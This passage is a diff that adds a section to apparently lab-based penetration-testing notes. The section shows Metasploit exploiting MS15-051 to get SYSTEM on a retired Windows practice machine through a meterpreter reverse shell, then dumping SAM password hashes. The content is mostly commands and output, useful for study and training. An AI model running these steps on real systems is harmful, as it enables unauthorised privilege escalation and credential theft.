@@ -823,6 +823,107 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 msf6 post(multi/recon/local_exploit_suggester) > 
 ```
 
+**MSF - Privilege Escalation**
+
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
+
+# [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+# Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    SESSION                   yes       The session to run this module on.
+
+
+# Payload options (windows/meterpreter/reverse_tcp):
+
+#    Name      Current Setting  Required  Description
+#    ----      ---------------  --------  -----------
+#    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+#    LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
+#    LPORT     4444             yes       The listen port
+
+
+# Exploit target:
+
+#    Id  Name
+#    --  ----
+#    0   Windows x86
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
+
+# SESSION => 1
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
+
+# LHOST => tun0
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+# [*] Started reverse TCP handler on 10.10.14.26:4444 
+# [*] Launching notepad to host the exploit...
+# [+] Process 844 launched.
+# [*] Reflectively injecting the exploit DLL into 844...
+# [*] Injecting exploit into 844...
+# [*] Exploit injected. Injecting payload into 844...
+# [*] Payload injected. Executing exploit...
+# [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+# [*] Sending stage (175174 bytes) to 10.10.10.15
+# [*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000
+
+meterpreter > getuid
+
+# Server username: NT AUTHORITY\SYSTEM
+
+``` 
+
+**MSF - Dumping Hashes**
+
+```bash
+meterpreter > hashdump
+
+# Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
+# ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
+# IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
+# Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
+# SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
+
+meterpreter > lsa_dump_sam
+
+# [+] Running as SYSTEM
+# [*] Dumping SAM
+# Domain : GRANNY
+# SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
+# Local SID : S-1-5-21-1709780765-3897210020-3926566182
+
+# SAMKey : 37ceb48682ea1b0197c7ab294ec405fe
+
+# RID  : 000001f4 (500)
+# User : Administrator
+#   Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
+#   Hash NTLM: d6908f022af0373e9e21b8a241c86dca
+
+# RID  : 000001f5 (501)
+# User : Guest
+
+# RID  : 000003e9 (1001)
+# User : SUPPORT_388945a0
+#   Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6
+
+# RID  : 000003eb (1003)
+# User : IUSR_GRANPA
+#   Hash LM  : a274b4532c9ca5cdf684351fab962e86
+#   Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88
+
+# ...
+```
+
 </details>
 
 </details>
